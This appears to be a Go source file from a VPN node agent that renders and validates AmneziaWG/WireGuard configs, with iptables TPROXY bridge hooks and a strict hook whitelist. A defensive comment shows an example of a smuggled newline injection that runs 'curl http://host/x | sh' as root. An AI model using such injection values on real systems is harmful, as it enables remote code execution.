// Package amneziawg implements CoreAdapter for AmneziaWG (DPI-resistant
// WireGuard fork). Slice 19 ships config generation and `awg syncconf`-based
// hot-reload, no kernel-module install or peer management yet (those land in
// the adapter and bootstrap commits).
//
// Obfuscation parameters split into two groups:
//   - Interface-immutable: S1-S4, H1-H4. Changing them requires bouncing every
//     client. Treated as set-once per inbound lifetime.
//   - Currently interface-fixed but client-tunable in upstream: Jc/Jmin/Jmax.
//     Phase 2 keeps them interface-wide for simplicity (matches bivlked's
//     installer); Phase 3 may diverge per-client if there's demand.
//
// Recommended defaults aim at Russian TSPU; admins override per-inbound in
// slice 23's editor (TSPU / Mobile / Custom presets).
package amneziawg

import (
	"encoding/base64"
	"errors"
	"fmt"
	"net/netip"
	"os"
	"path/filepath"
	"strings"

	"github.com/icecompany-tech/iceslab/apps/node/internal/atomicfile"
)

// allowedHookPrefixes is the strict whitelist of commands acceptable in
// PostUp/PostDown. awg-quick treats those fields as a shell command, so
// anything outside this list - pipes, redirects, &&, $(...), backticks,
// arbitrary binaries - is rejected with an error before render.
var allowedHookPrefixes = []string{
	"iptables ",
	"ip6tables ",
	"ip ", // `ip route add ...` etc.
	"sysctl ",
	"echo ", // common in install-time NAT setup snippets
}

// validatePostHook returns an error unless `cmd` either is empty or starts
// with one of `allowedHookPrefixes` AND contains no shell metacharacters.
// Empty string is fine, render emits an unused PostUp/PostDown line in
// that case, awg-quick treats it as a no-op.
func validatePostHook(cmd string) error {
	if cmd == "" {
		return nil
	}
	for _, ch := range []string{";", "&", "|", "$", "`", "\n", ">", "<"} {
		if strings.Contains(cmd, ch) {
			return fmt.Errorf("disallowed shell metacharacter %q in hook", ch)
		}
	}
	for _, p := range allowedHookPrefixes {
		if strings.HasPrefix(cmd, p) {
			return nil
		}
	}
	return fmt.Errorf("hook command must start with one of: %s", strings.Join(allowedHookPrefixes, ", "))
}

// InboundConfig is the static part of the AmneziaWG interface, generated once
// from admin settings (slice 23 will move these into the inbounds table) and
// kept constant across user mutations. Peer set is passed separately to
// renderConfig because it changes per AddUser/RemoveUser.
type InboundConfig struct {
	// Interface is the name of the awg device, e.g. "awg0". Must match what
	// `awg syncconf <iface>` will receive.
	Interface string

	// ListenPort is the public UDP port advertised to clients. Default 51820.
	ListenPort int

	// PrivateKey is the server's WireGuard private key (base64, 32 bytes raw).
	PrivateKey string

	// Address is the server's IP inside the tunnel, in CIDR form
	// (e.g. "10.0.0.1/24"). Must match the subnet the IP allocator
	// (panel-backend amneziawg.service) is handing out from.
	Address string

	// Plain renders an upstream-WireGuard interface instead of an AmneziaWG
	// one: every AWG-only directive below (Jc/Jmin/Jmax, S1-S4, H1-H4, I1-I5)
	// is omitted, because wg-quick's INI parser aborts on a key it doesn't
	// know, and validate() drops the H1-H4 rules, whose entire purpose is
	// keeping an AWG interface distinguishable from vanilla WG. Set from
	// Config.Protocol at construction, never from the panel wire.
	Plain bool

	// Junk parameters: currently interface-fixed in MVP.
	Jc   int // junk packet count
	Jmin int // junk packet size min
	Jmax int // junk packet size max

	// Magic header sizes: interface-immutable. Bouncing rotates all clients.
	S1, S2, S3, S4 int

	// Magic header values: interface-immutable, must be 32-bit and pairwise
	// distinct from one another and from WireGuard's defaults (1..4).
	H1, H2, H3, H4 uint32

	// I1-I5: optional v2.0 mimicry signature packets (hex strings).
	// When set, the kernel module emits these before the real handshake
	// to disguise the flow as QUIC / DNS / etc. Empty disables that
	// slot. Set via panel UI; flow through wire JSON to here, then
	// rendered into the awg-quick `[Interface]` block.
	I1, I2, I3, I4, I5 string

	// BridgeTproxyPort is bridge B: the loopback port of this node's local xray
	// dokodemo-door, to which every packet out of this interface is diverted
	// instead of being NAT'd straight onto the internet. 0 = no bridge, and the
	// rendered config is byte-identical to what it was before bridge B existed.
	//
	// Set only by the panel, and only when its cascade fragments actually carry
	// a matching inbound (inbounds.queue.ts reads the port back off them rather
	// than recomputing it). A port nobody listens on is a dead channel, not a
	// direct one, so the two halves are never emitted apart.
	BridgeTproxyPort int

	// Optional NAT/forwarding setup. Each element is rendered as its own
	// `PostUp =` / `PostDown =` line (awg-quick runs them in order), and each
	// is validated by validatePostHook, so a multi-rule setup stays within
	// the strict no-shell-metacharacter whitelist instead of being chained
	// with `;`. If empty, defaults to FORWARD ACCEPT + MASQUERADE (see
	// withDefaults). Operators on tightly-firewalled hosts may override.
	PostUp   []string
	PostDown []string
}

// Peer is a single [Peer] block. Generated from a panel `amneziawg_peers` row.
type Peer struct {
	PublicKey string
	// AllowedIP is the peer's IP in CIDR /32 form, e.g. "10.0.0.2/32".
	AllowedIP string
	// PresharedKey is the optional symmetric key mixed into the handshake,
	// same shape as a WG key (32 bytes, base64). Empty writes no line at all:
	// a blank `PresharedKey = ` is not "none", it is a parse error for
	// wg-quick and a handshake the client cannot complete.
	PresharedKey string
}

// ───── bridge B: kernel traffic into the node's local xray ─────
//
// A wg client's packet is decrypted and routed inside the kernel; no process
// sees it, so no process can be told to hand it over. The only thing that
// catches it before the routing decision and gives it to a local socket
// UNMODIFIED is TPROXY, and that is what these hooks install.
//
// Why the rules live in PostUp/PostDown rather than in adapter Go code: they
// must exist exactly as long as the interface does. A binding disabled, an
// inbound reconciled away, an operator running `wg-quick down` by hand - each
// tears the interface down, and rules that outlived it would divert nothing
// while looking installed. wg-quick's own lifecycle is the only thing that
// tracks all three.
//
// Why they are appended to PREROUTING directly instead of jumping to a private
// chain: `iptables -N` fails when the chain is already there, wg-quick runs
// PostUp under `set -e` with a teardown trap, and a chain left behind by an
// unclean stop would therefore make the interface refuse to come up at all -
// turning a stale rule into a dead channel. Every line below is instead a plain
// -A/-D pair that cannot fail that way. The cost is that a RETURN here ends
// PREROUTING traversal for that packet rather than returning to it; harmless,
// because every rule this adapter writes is scoped to one input interface and
// nothing else on the node uses mangle PREROUTING.

// bridgeMark and bridgeTable are per-FLAVOUR, not shared. A node can run
// wireguard and amneziawg at once, and the `ip rule` / routing table they need
// is node-global: one shared pair would have two owners, and whichever
// interface went down second would delete a rule the other still needed.
func bridgeMark(plain bool) string {
	if plain {
		return "0x11"
	}
	return "0x12"
}

func bridgeTable(plain bool) string {
	if plain {
		return "8811"
	}
	return "8812"
}

// bridgeExcludedDests never enter the bridge. This is not tidiness: without the
// link-local entry a tunnel client could ask the node's xray to fetch the
// hoster's cloud-metadata service on its behalf, and without the RFC1918 ones
// it could reach the hoster's internal LAN - s1 sits behind one (ens3 holds
// 192.168.0.130/24). They are RETURNed, and with no NAT for them left in place
// they then die on the node's FORWARD policy instead of leaving it with a
// private source address.
var bridgeExcludedDests = []string{
	"0.0.0.0/8",
	"10.0.0.0/8",
	"100.64.0.0/10",
	"127.0.0.0/8",
	"169.254.0.0/16",
	"172.16.0.0/12",
	"192.0.0.0/24",
	"192.168.0.0/16",
	"224.0.0.0/4",
	"240.0.0.0/4",
	"255.255.255.255/32",
}

// subnetFromAddress turns the server's in-tunnel address into the client subnet
// it belongs to: "10.0.0.1/24" -> "10.0.0.0/24". Needed for the one NAT rule
// the bridge keeps (ICMP), which must name a source range rather than an
// interface, because a MASQUERADE that names neither would cover the whole box.
func subnetFromAddress(addr string) (string, error) {
	pfx, err := netip.ParsePrefix(addr)
	if err != nil {
		return "", fmt.Errorf("parse address %q: %w", addr, err)
	}
	return pfx.Masked().String(), nil
}

// bridgeHooks renders the PostUp/PostDown pair that puts this interface behind
// the local xray. Mirror images by construction: every -A/-I has its -D below,
// same spec, so a bring-down leaves the node exactly as it found it.
func bridgeHooks(subnet string, port int, plain bool) (up, down []string) {
	mark := bridgeMark(plain)
	tproxy := func(proto string) string {
		// --on-ip 127.0.0.1 is not optional. The xray side binds loopback (so
		// the transparent inbound is unreachable from outside the node and
		// needs no firewall rule of its own), and without --on-ip xt_TPROXY
		// looks the socket up on the INPUT INTERFACE's address instead - i.e.
		// on the tunnel address, where nothing is listening, and every packet
		// is dropped with no log on either side.
		return fmt.Sprintf("iptables -t mangle -A PREROUTING -i %%i -p %s -j TPROXY --on-ip 127.0.0.1 --on-port %d --tproxy-mark %s",
			proto, port, mark)
	}

	// Divert. Exclusions first: -A appends, and the TPROXY lines below must be
	// the last thing a packet meets.
	for _, d := range bridgeExcludedDests {
		up = append(up, fmt.Sprintf("iptables -t mangle -A PREROUTING -i %%i -d %s -j RETURN", d))
	}
	up = append(up, tproxy("tcp"), tproxy("udp"))

	// Accept the diverted packet locally. It still carries its ORIGINAL
	// destination (TPROXY rewrites nothing), so a default-deny INPUT policy
	// would drop it; matching the mark TPROXY just set is exact, and lets
	// nothing else in from the tunnel.
	up = append(up, fmt.Sprintf("iptables -I INPUT 1 -i %%i -m mark --mark %s -j ACCEPT", mark))

	// ICMP is the one thing xray cannot carry at all, so it keeps the old
	// direct path: ping and traceroute leave from the ENTRY's address. They
	// carry no payload, and the alternative - ping that dies silently - reads
	// to a buyer as "the VPN is broken". Everything else that misses the divert
	// has no NAT and no FORWARD rule and dies on the node, which is the failure
	// mode worth having: loud, and never a wrong-country egress.
	up = append(up,
		"sysctl -w net.ipv4.ip_forward=1",
		"iptables -I FORWARD 1 -i %i -p icmp -j ACCEPT",
		"iptables -I FORWARD 1 -o %i -p icmp -j ACCEPT",
		fmt.Sprintf("iptables -t nat -A POSTROUTING -s %s -p icmp ! -o %%i -j MASQUERADE", subnet),
	)

	for _, u := range up {
		// Nothing to undo for sysctl: forwarding is a node-wide setting and
		// other interfaces may depend on it.
		if strings.HasPrefix(u, "iptables ") {
			down = append(down, undoRule(u))
		}
	}
	return up, down
}

// undoRule turns an iptables add into its exact removal, by the SHAPE of the
// command rather than by patching its text: `-A CHAIN` and `-I CHAIN POS` both
// become `-D CHAIN`, and everything after the chain is the match spec, carried
// over untouched.
//
// Written this way after a text-substitution version got it wrong: it stripped
// the insert position by looking for the literal that followed it in the rules
// it had been read against, so the one rule shaped differently kept its
// position and became `-D FORWARD 1 -o %i ...`, which iptables reads as a rule
// number and a spec at once and refuses. A -D that removes nothing is the worst
// half of this bridge to get wrong: the interface goes away and its divert
// stays, mangling traffic for a device that no longer exists.
func undoRule(add string) string {
	f := strings.Fields(add)
	out := make([]string, 0, len(f))
	for i := 0; i < len(f); i++ {
		switch f[i] {
		case "-A":
			out = append(out, "-D", f[i+1])
			i++
		case "-I":
			out = append(out, "-D", f[i+1])
			i += 2 // chain, then the insert position, which -D does not take
		default:
			out = append(out, f[i])
		}
	}
	return strings.Join(out, " ")
}

func (c *InboundConfig) withDefaults() InboundConfig {
	out := *c
	if out.Interface == "" {
		out.Interface = "awg0"
	}
	if out.ListenPort == 0 {
		out.ListenPort = 51820
	}
	// Address / Jc / Jmin / Jmax / S1-S4 used to have hardcoded defaults
	// here (10.0.0.1/24, 4, 40, 70, 72, 56, 32, 16), the TSPU-preset
	// values. That was wrong: zero is a legitimate value (operator wants
	// junk-obfuscation disabled), and the old subnet default collided
	// with some hosts' internal gateway. The panel UI now always sends explicit
	// values (per AmneziawgConfigSchema), so zero on the wire means
	// zero, not "use the default". Caught live cycle #6 2026-05-12:
	// admin set Jc=0 in UI to debug, server kept rendering Jc=4 because
	// of these defaults, handshake silently failed.
	if out.BridgeTproxyPort > 0 {
		// Bridge B REPLACES the NAT shape below rather than adding to it, and
		// that is the whole point. A blanket MASQUERADE and a divert cannot
		// coexist: whatever the divert does not take would leave the node
		// directly, which on a cascade entry is egress from the wrong country -
		// the exact defect this bridge exists to close, reappearing for
		// whichever flows happened to miss a rule. Measured on the s1 stand
		// 2026-09-02.
		//
		// An operator's own PostUp is overridden too. It cannot be honoured
		// here without knowing whether it fights the divert, and a hook that is
		// half-applied is worse than one that is refused.
		if subnet, err := subnetFromAddress(out.Address); err == nil {
			out.PostUp, out.PostDown = bridgeHooks(subnet, out.BridgeTproxyPort, out.Plain)
			return out
		}
		// Unparseable address: fall through to the plain shape. validate()
		// rejects the config immediately after, so this never reaches a node.
	}
	if len(out.PostUp) == 0 {
		// Two things are needed for a client to actually reach the internet:
		//
		//  1. FORWARD ACCEPT for the wg interface. Hosts running Docker or ufw
		//     ship a `FORWARD` policy of DROP (ufw's DEFAULT_FORWARD_POLICY,
		//     Docker's own chain), so forwarded packets from a wg peer are
		//     dropped even though the handshake (INPUT to the wg process)
		//     succeeds: the client shows "Connected" but has no internet.
		//     We INSERT at the top (`-I FORWARD 1`) rather than append,
		//     because on a ufw host `-A FORWARD` lands AFTER ufw's
		//     reject-forward chain and never matches. Caught live 2026-07-12
		//     on a DROP-policy node: AmneziaWG handshaked but no traffic flowed.
		//
		//  2. MASQUERADE on WAN egress. `! -o %i` matches packets exiting on ANY
		//     interface OTHER than the wg interface itself, i.e. real WAN
		//     egress. The earlier default used `-o %i` which MASQUERADE'd
		//     traffic going TO peers and never NAT'd the actual internet-bound
		//     traffic, so RX/TX was massively asymmetric (server forwarded
		//     decrypted requests with private src 10.x, responses never routed
		//     back). `! -o %i` works regardless of WAN iface name.
		out.PostUp = []string{
			"iptables -I FORWARD 1 -i %i -j ACCEPT",
			"iptables -I FORWARD 1 -o %i -j ACCEPT",
			"iptables -t nat -A POSTROUTING ! -o %i -j MASQUERADE",
		}
	}
	if len(out.PostDown) == 0 {
		out.PostDown = []string{
			"iptables -D FORWARD -i %i -j ACCEPT",
			"iptables -D FORWARD -o %i -j ACCEPT",
			"iptables -t nat -D POSTROUTING ! -o %i -j MASQUERADE",
		}
	}
	return out
}

// validateWGKey enforces "looks like a WireGuard key": exactly 44 chars
// from the standard base64 alphabet, decodes to 32 bytes. Anything else
// (notably newlines, '[', '=' in wrong place, shell metacharacters) is
// rejected. Wave-14 #1: pre-wave panel-pushed PublicKey was written into
// awg-quick INI via fmt.Fprintf with no validation, so a '\n' in the value
// could close [Peer] and inject [Interface]/PostUp=sh -c ... → root RCE on
// every interface bring-up. Whitelist input format here defeats it.
func validateWGKey(s string) error {
	if len(s) != 44 {
		return fmt.Errorf("wg key must be 44 base64 chars (got %d)", len(s))
	}
	raw, err := base64.StdEncoding.DecodeString(s)
	if err != nil {
		return fmt.Errorf("wg key not valid base64: %w", err)
	}
	if len(raw) != 32 {
		return fmt.Errorf("wg key must decode to 32 bytes (got %d)", len(raw))
	}
	return nil
}

// validateAllowedIP enforces CIDR notation (e.g. "10.66.66.5/32"). Rejects
// anything net/netip can't parse, same wave-14 #1 RCE class as validateWGKey.
func validateAllowedIP(s string) error {
	if _, err := netip.ParsePrefix(s); err != nil {
		return fmt.Errorf("AllowedIP not a valid CIDR: %w", err)
	}
	return nil
}

// validateIField enforces "looks like an AmneziaWG I-signature": either a plain
// hex string, or a 2.0 CPS (Custom Protocol Signature) built from the tags
// `<b 0xHEX>` (fixed bytes), `<r N>` (N random bytes) and `<t>` (timestamp),
// e.g. `<b 0xc00000000108><r 64><t>`, which mimics a QUIC Initial packet. Empty
// is allowed and means "slot disabled". The panel enforces the same character
// set (inbounds.schemas.ts ObfuscationSchema); keep the two in sync, or a value
// the panel accepts will be refused here and the inbound silently fails to apply.
//
// This is the same RCE class the WG-key and AllowedIP validators guard against:
// I1-I5 arrive over the panel-to-node wire and are written verbatim into the
// awg-quick INI's [Interface] block via fmt.Fprintf. A value carrying a newline
// (e.g. "aabb\nPostUp = curl http://host/x | sh") would close the I-line and
// inject a PostUp directive that awg-quick runs as root on interface bring-up.
// The set below is hex digits plus the CPS delimiters and tag letters only: it
// cannot form a newline, '[', '=' or any shell metacharacter, so neither INI
// nor PostUp injection is possible.
func validateIField(name, s string) error {
	for i := 0; i < len(s); i++ {
		c := s[i]
		ok := (c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F') ||
			c == 'x' || c == 'X' || c == '<' || c == '>' || c == ' ' || c == 'r' || c == 't'
		if !ok {
			return fmt.Errorf("%s: disallowed byte at index %d (allowed: hex, or a 2.0 CPS like <b 0x..><r N><t>)", name, i)
		}
	}
	return nil
}

func (c *InboundConfig) validate() error {
	if c.PrivateKey == "" {
		return errors.New("PrivateKey is required")
	}
	if err := validateWGKey(c.PrivateKey); err != nil {
		return fmt.Errorf("PrivateKey: %w", err)
	}
	if c.Plain {
		// Vanilla WireGuard: none of the obfuscation knobs exist on the wire,
		// so a non-zero one here means a caller mapped an AWG config onto a
		// plain interface. Fail loudly rather than render a config that
		// silently drops the obfuscation the operator thinks they configured.
		for _, f := range []struct {
			name string
			val  int
		}{{"Jc", c.Jc}, {"Jmin", c.Jmin}, {"Jmax", c.Jmax},
			{"S1", c.S1}, {"S2", c.S2}, {"S3", c.S3}, {"S4", c.S4}} {
			if f.val != 0 {
				return fmt.Errorf("%s=%d set on a plain WireGuard interface (obfuscation is AmneziaWG-only)", f.name, f.val)
			}
		}
		for _, f := range []struct {
			name string
			val  uint32
		}{{"H1", c.H1}, {"H2", c.H2}, {"H3", c.H3}, {"H4", c.H4}} {
			if f.val != 0 {
				return fmt.Errorf("%s=%d set on a plain WireGuard interface (magic headers are AmneziaWG-only)", f.name, f.val)
			}
		}
		for _, f := range []struct {
			name string
			val  string
		}{{"I1", c.I1}, {"I2", c.I2}, {"I3", c.I3}, {"I4", c.I4}, {"I5", c.I5}} {
			if f.val != "" {
				return fmt.Errorf("%s set on a plain WireGuard interface (mimicry packets are AmneziaWG-only)", f.name)
			}
		}
		return nil
	}
	for _, h := range []struct {
		name string
		val  uint32
	}{{"H1", c.H1}, {"H2", c.H2}, {"H3", c.H3}, {"H4", c.H4}} {
		if h.val == 0 {
			return fmt.Errorf("%s is required (must be a 32-bit value, non-zero, distinct from 1..4)", h.name)
		}
		if h.val <= 4 {
			return fmt.Errorf("%s=%d collides with WireGuard's default header values (1..4)", h.name, h.val)
		}
	}
	uniq := map[uint32]string{
		c.H1: "H1", c.H2: "H2", c.H3: "H3", c.H4: "H4",
	}
	if len(uniq) != 4 {
		return errors.New("H1-H4 must be pairwise distinct")
	}
	if c.Jmin > c.Jmax {
		return fmt.Errorf("Jmin (%d) must be <= Jmax (%d)", c.Jmin, c.Jmax)
	}
	for _, f := range []struct {
		name string
		val  string
	}{{"I1", c.I1}, {"I2", c.I2}, {"I3", c.I3}, {"I4", c.I4}, {"I5", c.I5}} {
		if err := validateIField(f.name, f.val); err != nil {
			return err
		}
	}
	return nil
}

// renderConfig produces a complete awg-quick config string for the given peers.
// Output is plain text (not JSON) because that's what `awg syncconf` and
// `awg-quick` consume. Peers are written in the order received, caller is
// expected to sort by IP if it wants stable diffs.
func renderConfig(inbound InboundConfig, peers []Peer) (string, error) {
	if err := inbound.validate(); err != nil {
		return "", err
	}
	cfg := inbound.withDefaults()

	var b strings.Builder
	fmt.Fprintln(&b, "[Interface]")
	fmt.Fprintf(&b, "PrivateKey = %s\n", cfg.PrivateKey)
	fmt.Fprintf(&b, "ListenPort = %d\n", cfg.ListenPort)
	fmt.Fprintf(&b, "Address = %s\n", cfg.Address)
	// Plain WireGuard stops here. Measured on wireguard-tools 1.0.20210914
	// against a config from our own AmneziaWG builder: `wg setconf` answers
	// `Line unrecognized: 'Jc=4'` / `Configuration parsing error` and exits 1,
	// and `wg-quick up` follows that with `ip link delete dev <iface>`. So an
	// AWG-shaped [Interface] block is not merely redundant on a vanilla
	// interface - it stops the interface coming up at all.
	if !cfg.Plain {
		renderObfuscation(&b, cfg)
	}
	// awg-quick evaluates PostUp/PostDown as a shell command, so anything
	// we render here runs as root on every interface bounce. PostUp/Down
	// are NOT accepted on the panel→node wire (see adapter.go ApplyInbound),
	// they only reach this point from install-time env on the VPS, which
	// is admin-controlled. We still hard-whitelist allowed command prefixes
	// here as defence-in-depth so a future maintainer who plumbs them
	// through the wire by accident can't accidentally introduce RCE.
	// Each command is validated and emitted as its own PostUp/PostDown line;
	// awg-quick runs them in order. This keeps every rule inside the strict
	// single-command whitelist (validatePostHook rejects ';' and friends).
	for _, cmd := range cfg.PostUp {
		if err := validatePostHook(cmd); err != nil {
			return "", fmt.Errorf("PostUp: %w", err)
		}
		fmt.Fprintf(&b, "PostUp = %s\n", cmd)
	}
	for _, cmd := range cfg.PostDown {
		if err := validatePostHook(cmd); err != nil {
			return "", fmt.Errorf("PostDown: %w", err)
		}
		fmt.Fprintf(&b, "PostDown = %s\n", cmd)
	}

	for _, p := range peers {
		if p.PublicKey == "" || p.AllowedIP == "" {
			return "", fmt.Errorf("peer with empty PublicKey or AllowedIP: %+v", p)
		}
		if err := validateWGKey(p.PublicKey); err != nil {
			return "", fmt.Errorf("peer PublicKey: %w", err)
		}
		if err := validateAllowedIP(p.AllowedIP); err != nil {
			return "", fmt.Errorf("peer AllowedIP: %w", err)
		}
		// Validated with the same rule as the public key: a PSK is 32 bytes of
		// base64 too, and this is the guard that keeps a rogue value from
		// closing [Peer] and injecting an [Interface]/PostUp of its own.
		if p.PresharedKey != "" {
			if err := validateWGKey(p.PresharedKey); err != nil {
				return "", fmt.Errorf("peer PresharedKey: %w", err)
			}
		}
		fmt.Fprintln(&b)
		fmt.Fprintln(&b, "[Peer]")
		fmt.Fprintf(&b, "PublicKey = %s\n", p.PublicKey)
		if p.PresharedKey != "" {
			fmt.Fprintf(&b, "PresharedKey = %s\n", p.PresharedKey)
		}
		fmt.Fprintf(&b, "AllowedIPs = %s\n", p.AllowedIP)
	}

	return b.String(), nil
}

// renderObfuscation writes the AmneziaWG-only part of the [Interface] block.
// Split out of renderConfig so the plain-WireGuard path can skip it wholesale
// rather than emitting zeroes, which wg-quick would refuse to parse.
func renderObfuscation(b *strings.Builder, cfg InboundConfig) {
	fmt.Fprintf(b, "Jc = %d\n", cfg.Jc)
	fmt.Fprintf(b, "Jmin = %d\n", cfg.Jmin)
	fmt.Fprintf(b, "Jmax = %d\n", cfg.Jmax)
	fmt.Fprintf(b, "S1 = %d\n", cfg.S1)
	fmt.Fprintf(b, "S2 = %d\n", cfg.S2)
	fmt.Fprintf(b, "S3 = %d\n", cfg.S3)
	fmt.Fprintf(b, "S4 = %d\n", cfg.S4)
	fmt.Fprintf(b, "H1 = %d\n", cfg.H1)
	fmt.Fprintf(b, "H2 = %d\n", cfg.H2)
	fmt.Fprintf(b, "H3 = %d\n", cfg.H3)
	fmt.Fprintf(b, "H4 = %d\n", cfg.H4)
	// I1-I5 are emitted only when non-empty, empty strings mean "no
	// mimicry packet for this slot", and awg-quick rejects empty hex.
	for i, val := range []string{cfg.I1, cfg.I2, cfg.I3, cfg.I4, cfg.I5} {
		if val != "" {
			fmt.Fprintf(b, "I%d = %s\n", i+1, val)
		}
	}
}

// writeConfig atomically writes the awg config to disk via the shared
// atomicfile helper (fsync(file) + fsync(dir) for power-loss durability).
// Mode 0o600, file contains the server's private key.
func writeConfig(path string, blob string) error {
	dir := filepath.Dir(path)
	if err := os.MkdirAll(dir, 0o755); err != nil {
		return fmt.Errorf("mkdir %s: %w", dir, err)
	}
	return atomicfile.Write(path, []byte(blob), 0o600)
}
